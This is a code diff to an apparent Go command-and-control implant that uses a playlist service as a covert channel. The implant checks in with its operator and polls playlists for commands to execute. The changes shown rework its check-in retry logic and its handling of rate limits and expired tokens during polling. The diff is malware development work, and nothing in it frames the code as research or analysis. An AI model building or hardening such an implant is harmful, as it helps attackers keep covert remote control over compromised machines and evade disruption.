@@ -88,18 +88,9 @@ func (imp *Implant) sendCheckin() {
 
 	err = imp.client.WriteC2Playlists(ctx, chunks)
 	if err != nil {
-		wait := handleAPIError(err, "checkin")
-		if wait > 0 && wait < 300 {
-			fmt.Printf("[*] Waiting %s before retry...\n", formatDuration(wait))
-			time.Sleep(time.Duration(wait) * time.Second)
-			// One retry after wait
-			if err2 := imp.client.WriteC2Playlists(ctx, chunks); err2 == nil {
-				fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
-		clientID, time.Now().Format("15:04:05"))
-				imp.checkinPending = false
-				return
-			}
-		}
+		fmt.Printf("[!] Checkin failed at %s: %v\n",
+			time.Now().Format("15:04:05"), err)
+		fmt.Println("[*] Will retry on next poll cycle")
 		imp.checkinPending = true
 		return
 	}
@@ -214,11 +205,20 @@ func (imp *Implant) pollAndExecute() {
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
-		wait := handleAPIError(err, "poll")
-		if wait > 0 {
-			// Sleep for the rate limit period instead of normal interval
-			fmt.Printf("[*] Backing off for %s...\n", formatDuration(wait))
-			time.Sleep(time.Duration(wait) * time.Second)
+		if isTokenExpired(err) {
+			fmt.Printf("[!] Token expired at %s: delete .cache-* and re-authenticate\n",
+				time.Now().Format("15:04:05"))
+		} else if isRateLimit(err) {
+			retryAfter := parseRetryAfter(err)
+			if retryAfter > 0 {
+				fmt.Printf("[!] Rate limited at %s, backing off %s\n",
+					time.Now().Format("15:04:05"), formatDuration(retryAfter))
+				time.Sleep(time.Duration(retryAfter) * time.Second)
+			}
+			// If retryAfter==0, just silently skip this cycle
+		} else {
+			fmt.Printf("[!] Poll error at %s: %v\n",
+				time.Now().Format("15:04:05"), err)
 		}
 		return
 	}
